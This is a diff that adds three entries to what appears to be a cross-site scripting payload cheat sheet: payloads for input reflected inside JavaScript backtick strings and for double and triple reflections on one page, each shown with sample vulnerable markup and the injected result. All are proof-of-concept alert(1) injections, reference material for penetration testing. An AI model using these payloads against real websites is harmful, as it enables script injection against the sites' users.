@@ -185,5 +185,63 @@ The quotes are escaped by a backslash so we need to bypass them
 
 > Payload number 2 uses when quote escaped by backslash
 
+11. Use when input lands inside backticks delimited strings
+```html
+${alert(1)}
+```
+
+* Example source code
+```html
+<script>
+    var dapos = `REFLECTED_HERE`;
+</script>
+```
+
+* After input the payload
+```html
+<script>
+    var dapos = `${alert(1)}`;
+</script>
+```
+
+12. Uses when there is multiple reflections on same page. (Double Reflection)
+```html
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+```
+
+* After input the payload
+```html
+<!DOCTYPE html>
+<html>
+<body>
+'onload=alert(1)><svg/1='
+[...]
+'onload=alert(1)><svg/1='
+</body>
+</html>
+```
+
+13. Uses when there is multiple reflections on same page. (Triple Reflection)
+```html
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+```
+
+* After input the payload
+```html
+<!DOCTYPE html>
+<html>
+<body>
+*/alert(1)">'onload="/*<svg/1='
+[...]
+*/alert(1)">'onload="/*<svg/1='
+[...]
+*/alert(1)">'onload="/*<svg/1='
+</body>
+</html>
+```
 
 *Will be updated again!
